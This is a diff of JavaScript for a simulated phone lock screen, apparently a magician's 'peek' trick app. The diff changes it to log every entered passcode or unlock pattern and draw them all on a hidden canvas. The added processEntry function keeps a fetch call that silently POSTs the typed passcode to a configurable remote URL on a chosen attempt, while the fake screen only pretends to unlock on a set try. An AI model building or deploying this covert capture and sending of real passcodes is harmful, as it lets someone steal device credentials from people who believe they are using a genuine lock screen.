@@ -1,7 +1,7 @@
 let attemptCount = 0;
 let forceSuccess = false;
 let currentInput = "";
-let peekData = null;
+let peekStack = []; // History of tries
 let lastTapTime = 0;
 let holdTimer;
 let globalTapCount = 0;
@@ -83,11 +83,8 @@ function setupCarouselLoop() {
     container.addEventListener('scroll', () => {
         const x = container.scrollLeft;
         const width = window.innerWidth;
-        if (x <= 0) {
-            container.scrollLeft = width * totalSlides;
-        } else if (x >= width * (totalSlides + 1)) {
-            container.scrollLeft = width;
-        }
+        if (x <= 0) container.scrollLeft = width * totalSlides;
+        else if (x >= width * (totalSlides + 1)) container.scrollLeft = width;
     });
 }
 
@@ -128,6 +125,66 @@ document.getElementById('secret-trigger-home').addEventListener('touchstart', e 
     }
 });
 
+function processEntry(val, isPattern = false) {
+    attemptCount++;
+    peekStack.push({ attempt: attemptCount, data: isPattern ? val.split('-').map(Number) : val, isPattern: isPattern });
+
+    if (attemptCount === config.sendAt && config.url) fetch(config.url, {method: 'POST', mode: 'no-cors', body: JSON.stringify({passcode: val})});
+    
+    if (attemptCount === config.successAt || forceSuccess) {
+        document.getElementById('unlock-sound').play();
+        document.getElementById('lock-page').classList.add('hidden');
+        document.getElementById('home-page').classList.remove('hidden');
+        const container = document.getElementById('carousel-container');
+        container.scrollTo({ left: window.innerWidth, behavior: 'instant' });
+    } else {
+        if(navigator.vibrate) navigator.vibrate([100, 50, 100]); 
+        document.getElementById('lock-content').classList.add('shake');
+        setTimeout(() => document.getElementById('lock-content').classList.remove('shake'), 400);
+        currentInput = "";
+        document.querySelectorAll('.dot').forEach(d => d.classList.remove('filled'));
+        if(document.getElementById('hidden-pass-input')) document.getElementById('hidden-pass-input').value = "";
+    }
+}
+
+function drawPeek(targetCanvasId) {
+    const pCanvas = document.getElementById(targetCanvasId);
+    const pCtx = pCanvas.getContext('2d');
+    const rowH = 35;
+    pCanvas.width = 110;
+    pCanvas.height = Math.max(40, peekStack.length * rowH + 10);
+    pCtx.clearRect(0, 0, pCanvas.width, pCanvas.height);
+
+    peekStack.forEach((item, idx) => {
+        const yOff = idx * rowH;
+        pCtx.strokeStyle = "white"; pCtx.fillStyle = "white"; pCtx.lineWidth = 1.5;
+        pCtx.font = "12px Arial"; pCtx.textAlign = "left";
+        pCtx.fillText(`${item.attempt}.`, 8, yOff + 22);
+
+        if (item.isPattern) {
+            item.data.forEach((id, i) => {
+                const x = (id % 3) * 8 + 30; const y = Math.floor(id / 3) * 8 + (yOff + 10);
+                if (i > 0) {
+                    const prevId = item.data[i-1];
+                    pCtx.beginPath();
+                    pCtx.moveTo((prevId % 3) * 8 + 30, Math.floor(prevId / 3) * 8 + (yOff + 10));
+                    pCtx.lineTo(x, y); pCtx.stroke();
+                }
+                pCtx.beginPath(); pCtx.arc(x, y, 1, 0, Math.PI * 2); pCtx.fill();
+            });
+        } else {
+            pCtx.font = "bold 13px Courier New"; pCtx.fillText(item.data, 30, yOff + 22);
+        }
+    });
+}
+
+function updateTime() {
+    const now = new Date();
+    let hours = now.getHours() % 12 || 12;
+    const timeStr = `${hours}:${now.getMinutes().toString().padStart(2, '0')}`;
+    document.querySelectorAll('.clock').forEach(el => el.innerText = timeStr);
+}
+
 const canvas = document.getElementById('pattern-canvas');
 const ctx = canvas.getContext('2d');
 const dotsArray = [];
@@ -166,27 +223,6 @@ canvas.addEventListener('touchend', () => {
     currentPattern = []; drawDots();
 });
 
-function processEntry(val, isPattern = false) {
-    attemptCount++;
-    if (attemptCount === config.peekAt) peekData = isPattern ? val.split('-').map(Number) : val;
-    if (attemptCount === config.sendAt && config.url) fetch(config.url, {method: 'POST', mode: 'no-cors', body: JSON.stringify({passcode: val})});
-    
-    if (attemptCount === config.successAt || forceSuccess) {
-        document.getElementById('unlock-sound').play();
-        document.getElementById('lock-page').classList.add('hidden');
-        document.getElementById('home-page').classList.remove('hidden');
-        const container = document.getElementById('carousel-container');
-        container.scrollTo({ left: window.innerWidth, behavior: 'instant' });
-    } else {
-        if(navigator.vibrate) navigator.vibrate([100, 50, 100]); 
-        document.getElementById('lock-content').classList.add('shake');
-        setTimeout(() => document.getElementById('lock-content').classList.remove('shake'), 400);
-        currentInput = "";
-        document.querySelectorAll('.dot').forEach(d => d.classList.remove('filled'));
-        if(document.getElementById('hidden-pass-input')) document.getElementById('hidden-pass-input').value = "";
-    }
-}
-
 document.querySelectorAll('.num').forEach(btn => {
     btn.addEventListener('click', () => {
         const val = btn.childNodes[0].textContent.trim();
@@ -197,40 +233,4 @@ document.querySelectorAll('.num').forEach(btn => {
         if (currentInput.length === limit) setTimeout(() => processEntry(currentInput), 200);
     });
 });
-
-function drawPeek(targetCanvasId) {
-    const pCanvas = document.getElementById(targetCanvasId);
-    const pCtx = pCanvas.getContext('2d');
-    pCtx.clearRect(0, 0, 80, 80);
-    if (!peekData) return;
-    pCtx.strokeStyle = "white"; pCtx.fillStyle = "white"; pCtx.lineWidth = 2;
-    if (Array.isArray(peekData)) {
-        pCtx.beginPath();
-        peekData.forEach((id, i) => {
-            const x = (id % 3) * 20 + 20; const y = Math.floor(id / 3) * 20 + 20;
-            if(i === 0) pCtx.moveTo(x,y); 
-            else {
-                const px = (peekData[i-1] % 3) * 20 + 20; const py = Math.floor(peekData[i-1] / 3) * 20 + 20;
-                pCtx.lineTo(x,y);
-                const angle = Math.atan2(y - py, x - px);
-                const mx = (px + x) / 2; const my = (py + y) / 2;
-                pCtx.moveTo(mx, my);
-                pCtx.lineTo(mx - 6 * Math.cos(angle - Math.PI / 6), my - 6 * Math.sin(angle - Math.PI / 6));
-                pCtx.moveTo(mx, my);
-                pCtx.lineTo(mx - 6 * Math.cos(angle + Math.PI / 6), my - 6 * Math.sin(angle + Math.PI / 6));
-                pCtx.moveTo(x, y);
-            }
-        });
-        pCtx.stroke();
-    } else {
-        pCtx.font = "bold 16px Arial"; pCtx.textAlign = "center"; pCtx.fillText(peekData, 40, 45);
-    }
-}
-
-function updateTime() {
-    const now = new Date();
-    let hours = now.getHours() % 12 || 12;
-    const timeStr = `${hours}:${now.getMinutes().toString().padStart(2, '0')}`;
-    document.querySelectorAll('.clock').forEach(el => el.innerText = timeStr);
-}
 
